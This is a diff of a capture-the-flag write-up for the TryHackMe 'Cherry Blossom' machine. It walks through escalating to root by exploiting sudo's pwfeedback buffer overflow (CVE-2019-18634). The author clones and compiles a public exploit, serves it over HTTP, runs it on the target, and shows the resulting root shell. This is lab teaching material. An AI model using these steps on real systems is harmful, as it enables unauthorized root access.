@@ -512,18 +512,19 @@ command:```su johan```
 
 cool hehe😎. Lets further escalate our privileges
 
-Using the ```uname -a``` command to display system information. 
+Running the command ```sudo -l```
 
-![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/5e0cc171-c6ae-4ccf-8749-c5b5a7a6f35a)
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/c64c759f-e0a4-444b-94b3-bffeb03d4b21)
 
-There seems to be an exploit available for the version of Ubuntu. You can access it [here](https://github.com/saleemrashid/sudo-cve-2019-18634)
+From the above screenshot, you can see that we are getting the password echoed back to us, now this isn't meant to be actually. This is a function called pwfeedback thats enabled in the ```/etc/sudoers``` config, so basically a stack-based buffer overflow in the privileged sudo process. You can read more about it [here](https://nvd.nist.gov/vuln/detail/CVE-2019-18634)
+
+After a little research I found an [exploit](https://github.com/saleemrashid/sudo-cve-2019-18634)
 
 ![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/0b19422d-c023-41ba-8fc0-148b9bb93d2f)
 
 clone this to your machine and compile
 
-```
-                                                                                                                                                                       
+```                                    
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom]
 └─$ git clone https://github.com/saleemrashid/sudo-cve-2019-18634.git     
 Cloning into 'sudo-cve-2019-18634'...
@@ -540,26 +541,56 @@ Resolving deltas: 100% (14/14), done.
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
 └─$ ls 
 exploit.c  LICENSE  Makefile  README.md
-                                                                                                                                                                       
-┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
-└─$ gcc exploit.c -o exploit                                         
-                                                                                                                                                                       
+```
+To compile this exploit, I tried using the ```gcc``` compiler but I was getting an error. I guess this is because the gcc compiler on my machine was the newer version. We also can't compile this on the target's machine because the compiler ```gcc``` isn't installed on the target's machine.
+
+Well, what did I do next??
+
+I got an idea from my sensei😎 to use compile using makefile, doing my research on this led me to a compiler known as ```cc```, well this is the first time I'll also be hearing about this compiler.
+
+command:```cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o abeg_gimme_shell exploit.c```
+
+<font color="green">The command is a compilation command  for the C program called "exploit.c". The command compiles the exploit.c source file using the specified compiler and linker options, and produces an executable binary called "abeg_gimme_shell"</font>
+
+Running this,
+
+```                                                                                            
 ┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
 └─$ ls
-exploit  exploit.c  LICENSE  Makefile  README.md
+exploit.c  LICENSE  Makefile  README.md
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ cc -Os -g3 -std=c11 -Wall -Wextra -Wpedantic -static -o abeg_gimme_shell exploit.c
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ ls
+abeg_gimme_shell  exploit.c  LICENSE  Makefile  README.md
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ file abeg_gimme_shell 
+abeg_gimme_shell: ELF 64-bit LSB executable, x86-64, version 1 (GNU/Linux), statically linked, BuildID[sha1]=5351fd74f389f9f811d0023f8f89c767a9236041, for GNU/Linux 3.2.0, with debug_info, not stripped
+                                                                                                                                                                                                                                
+┌──(bl4ck4non㉿bl4ck4non)-[~/Downloads/TryHackMe/Cherry_Blossom/sudo-cve-2019-18634]
+└─$ python3 -m http.server 80
+Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
 ```
-Now, lets send the compiled exploit named ```exploit``` to the target's machine
+cool, now lets send this over to the target's machine
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/2416785f-9206-4414-abb4-94cbce65c9f6)
 
+After this, run
 
+command:```chmod +x abeg_gimme_shell``` then ```./abeg_gimme_shell```
 
+This should get us a root shell
 
+![image](https://github.com/BlackAnon22/BlackAnon22.github.io/assets/67879936/09f71229-c514-4496-b02c-8f8d14e076f1)
 
+We got a shell as the ```root``` user😊.
 
-
-
-
-
+That will be all for today
+<br> <br>
+[Back To Home](../../index.md)
 
 
 
